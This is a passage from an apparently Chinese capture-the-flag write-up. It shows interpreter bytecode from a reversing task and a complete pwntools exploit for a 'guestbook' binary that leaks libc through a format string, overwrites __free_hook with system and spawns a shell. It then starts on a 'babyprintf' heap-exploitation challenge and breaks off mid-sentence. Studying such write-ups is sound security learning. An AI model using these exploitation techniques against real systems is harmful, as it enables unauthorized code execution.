<span class="token comment">#define _cmpeq (19&lt;&lt;1)</span>
<span class="token comment">#define loop (20&lt;&lt;1)</span>
<span class="token comment">#define code_end (21&lt;&lt;1)</span>
<span class="token operator">/</span><span class="token operator">/</span>type
<span class="token comment">#define rn 0 </span>
<span class="token comment">#define rr 1</span></code></pre><p>&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x4EE5;&#x53CA;&#x53D8;&#x91CF;&#xFF0C;&#x89E3;&#x91CA;&#x5668;&#x6307;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x6307;&#x4EE4;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x79CD;&#x7C7B;&#x3002;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x6307;&#x4EE4;&#x7531;&#x9AD8;7&#x4F4D;&#x7684;&#x7C7B;&#x578B;&#x548C;&#x4F4E;1&#x4F4D;&#x7684;&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x7EC4;&#x6210;&#x3002;</p> <p><code>rr</code>&#x8868;&#x793A;<code>op reg<span class="token punctuation">,</span>reg</code>,<code>rn</code>&#x8868;&#x793A;<code>op reg<span class="token punctuation">,</span>num</code>&#x3002;</p> <p>&#x7528;&#x5B8F;&#x5199;&#x7684;&#x89E3;&#x91CA;&#x4EE3;&#x7801;</p> <pre><code>char code\<span class="token punctuation">[</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        \_lea\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ebx<span class="token punctuation">,</span> _flag<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>

        loop<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span>
        _mod <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>
        \_lea\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span> _ebx<span class="token punctuation">,</span>
        \_add\_pch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_ldr\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rn<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
        _cmpl <span class="token operator">|</span> rn<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>

        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>
        \_add\_pint <span class="token operator">|</span> rn<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ebx2<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>
        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span> _ebx2<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_and <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span>
        _shr <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>
        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span> _ebx2<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_and <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span>
        _shl <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>
        \_add\_pint <span class="token operator">|</span> rn<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ebx2<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>
        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span> _ebx2<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_and <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span>
        _shr <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>
        _pop <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rn<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
        _cmpl <span class="token operator">|</span> rn<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>

        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span> _ebx2<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_and <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span>
        _shl <span class="token operator">|</span> rn<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>

        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        _mov32 <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span> _key<span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>
        \_add\_pint <span class="token operator">|</span> rn<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ebx2<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>
        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span> _ebx2<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        _pop <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _ror <span class="token operator">|</span> rn<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rn<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
        _cmpl <span class="token operator">|</span> rn<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>

        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        \_my\_xor <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span>
        \_lea\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>_ebx<span class="token punctuation">,</span>_enc<span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>
        \_lea\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span> _ebx<span class="token punctuation">,</span>
        \_add\_pch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span>
        \_ldr\_ch <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>\_t\_chp<span class="token punctuation">,</span>
        _mov <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        \_lea\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>
        \_add\_pint <span class="token operator">|</span> rn<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span>
        \_ldr\_int <span class="token operator">|</span> rr<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>\_t\_intp<span class="token punctuation">,</span>
        _pop <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        _push <span class="token operator">|</span> rr<span class="token punctuation">,</span>_esp<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>
        _cmpeq <span class="token operator">|</span> rr<span class="token punctuation">,</span>_eax<span class="token punctuation">,</span>\_t\_int<span class="token punctuation">,</span>
        \_my\_or <span class="token operator">|</span> rr<span class="token punctuation">,</span>_edx<span class="token punctuation">,</span> _neq<span class="token punctuation">,</span>
        _add <span class="token operator">|</span> rn<span class="token punctuation">,</span>_ecx<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>
        _cmpl <span class="token operator">|</span> rn<span class="token punctuation">,</span> _ecx<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>
        loop<span class="token punctuation">,</span>

        code_end
    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>&#x5176;&#x4E2D;loop&#x7684;&#x5B9E;&#x73B0;&#x662F;&#x7528;&#x8BB0;&#x5F55;ip&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p> <p>&#x5B8C;&#x6574;&#x7684;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x89C1;github&#x3002;</p> <h3 id="guestbook">guestbook</h3> <p>&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x9053;pwn&#xFF0C;&#x51FA;&#x7684;&#x5E94;&#x8BE5;&#x662F;&#x6BD4;&#x8F83;&#x8001;&#x5957;&#x7B80;&#x5355;&#x7684;&#x4E1C;&#x897F;&#x3002;</p> <p>&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x70B9;&#x6709;&#x4E09;&#x4E2A;&#x3002;</p> <p>&#x5229;&#x7528;ebp chain&#x548C;fmt&#x6765;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x3002;</p> <p>&#x5BF9;<code>__free_hook</code>&#x7684;&#x4E86;&#x89E3;&#x3002;</p> <p>&#x5BF9;<code>$<span class="token number">0</span></code>get shell&#x7684;&#x4E86;&#x89E3;&#xFF08;&#x6700;&#x540E;&#x8C8C;&#x4F3C;&#x65E0;&#x4EBA;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x6709;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x3002;&#xFF09;</p> <p>&#x6211;&#x7684;exp:</p> <pre><code>from pwn import <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&apos;debug&apos;</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> \<span class="token punctuation">[</span><span class="token string">&apos;terminator&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;-x&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;bash&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;-c&apos;</span>\<span class="token punctuation">]</span>

bin <span class="token operator">=</span> <span class="token constant">ELF</span><span class="token punctuation">(</span><span class="token string">&apos;./guestbook&apos;</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> <span class="token constant">ELF</span><span class="token punctuation">(</span><span class="token string">&apos;./libc.so&apos;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">add</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phone<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;1&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;OK,your guest index is &apos;</span><span class="token punctuation">)</span>
    idx <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;\\n&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;?&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;?&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phone<span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;success!\\n&apos;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> idx

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">see</span></span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;2&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;index:&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;the name:&apos;</span><span class="token punctuation">)</span>
    name <span class="token operator">=</span> cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;\\n&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;the phone:&apos;</span><span class="token punctuation">)</span>
    phone <span class="token operator">=</span> cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;\\n&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;===========&apos;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> \<span class="token punctuation">[</span>name<span class="token punctuation">,</span>phone\<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">delete</span></span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&apos;3&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&apos;index:&apos;</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">fmt</span></span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">:</span>
    idx <span class="token operator">=</span> add<span class="token punctuation">(</span>pay<span class="token punctuation">,</span><span class="token string">&apos;1111&apos;</span><span class="token punctuation">)</span>
    see<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">fmt2</span></span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">:</span>
    idx <span class="token operator">=</span> add<span class="token punctuation">(</span>pay<span class="token punctuation">,</span><span class="token string">&apos;1111&apos;</span><span class="token punctuation">)</span>
    see<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">z</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>cn<span class="token punctuation">)</span>
    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&apos;./guestbook&apos;</span><span class="token punctuation">)</span>

idx <span class="token operator">=</span> add<span class="token punctuation">(</span><span class="token string">&apos;%3$x&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;0&apos;</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>see<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">71</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols\<span class="token punctuation">[</span><span class="token string">&apos;\_IO\_2\_1\_stdout_&apos;</span>\<span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x001B38B0</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols\<span class="token punctuation">[</span><span class="token string">&apos;system&apos;</span>\<span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token string">&apos;libc_base: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">&apos;free_hook: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">&apos;system: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

idx <span class="token operator">=</span> add<span class="token punctuation">(</span><span class="token string">&apos;%72$x&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;1&apos;</span><span class="token punctuation">)</span>
ebp_2 <span class="token operator">=</span> int<span class="token punctuation">(</span>see<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>\<span class="token punctuation">[</span><span class="token number">0</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>\<span class="token comment"># %80$x</span>
ebp_1 <span class="token operator">=</span> ebp_2<span class="token operator">-</span><span class="token number">0x20</span>\<span class="token comment"># %72$x</span>
ebp_3 <span class="token operator">=</span> ebp_2<span class="token operator">+</span><span class="token number">0x20</span>\<span class="token comment"># %88$x</span>

success<span class="token punctuation">(</span><span class="token string">&apos;ebp_1: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ebp_1<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">&apos;ebp_2: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ebp_2<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">&apos;ebp_3: &apos;</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ebp_3<span class="token punctuation">)</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>ebp_3<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%80$hn&apos;</span>
fmt<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>ebp_3<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%72$hn&apos;</span>
fmt<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ebp_3<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff0000</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%80$hn&apos;</span>
fmt<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>ebp_3<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%72$hn&apos;</span>
fmt<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%88$hn&apos;</span>
fmt<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment">#z()</span>
pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%90$hn&apos;</span>
fmt2<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%88$hn&apos;</span>
fmt2<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">&apos;%&apos;</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff0000</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;c%90$hn&apos;</span>
fmt2<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

idx<span class="token operator">=</span>add<span class="token punctuation">(</span><span class="token string">&apos;get shell&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;$0\\x00&apos;</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>

cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="babyprintf">babyprintf</h3> <p>&#x9898;&#x76EE;&#x53EA;&#x6709;malloc&#x548C;&#x4E00;&#x4E2A;printf_chk&#xFF0C;printf_chk&#x548C;printf&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x6709;&#x4E24;&#x70B9;&#xFF1A;</p> <ul> <li><ol> <li>&#x4E0D;&#x80FD;&#x4F7F;&#x7528;$n&#x4E0D;&#x8FDE;&#x7EED;&#x7684;&#x6253;&#x5370;</li> </ol> </li> <li><ol> <li>&#x5728;&#x4F7F;&#x7528;%n&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x505A;&#x4E00;&#x7CFB;&#x5217;&#x68C0;&#x67E5;</li> </ol> </li> </ul> <p>&#x867D;&#x7136;&#x5982;&#x6B64;&#xFF0C;&#x4F46;leak libc&#x5730;&#x5740;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x6211;&#x60F3;&#x5927;&#x90E8;&#x5206;&#x4EBA;&#x90FD;&#x60F3;&#x5230;&#x4E86;&#x3002;</p> <p>&#x7136;&#x540E;&#x91CD;&#x70B9;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x7A0B;&#x5E8F;&#x552F;&#x4E00;&#x7684;&#x5806;&#x6EA2;&#x51FA;&#x3002;&#x6CA1;&#x6709;free&#x7684;&#x95EE;&#x9898; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;free topchunk&#x89E3;&#x51B3;&#xFF0C;&#x7136;&#x540E;&#x5F88;&#x591A;&#x9009;&#x624B;&#x5728;&#x8FD9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;unsortedbin attack&#x62FF;&#x5230;shell&#x3002;</p> <p>&#x5982;&#x4F55;&#x901A;&#x8FC7;unsortedbin attack&#x5229;&#x7528;&#x6211;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;, &#x5E94;&#x8BE5;&#x4F1A;&#x6709;&#x5176;&#x4ED6;wp&#x653E;&#x51FA;&#x3002;&#x6211;&#x8BF4;&#x4E00;&#x4E0B;&#x5982;&#x4F55;&#x5229;&#x7528; fastbin attack&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x80FD;free &#x4E00;&#x4E2A;top 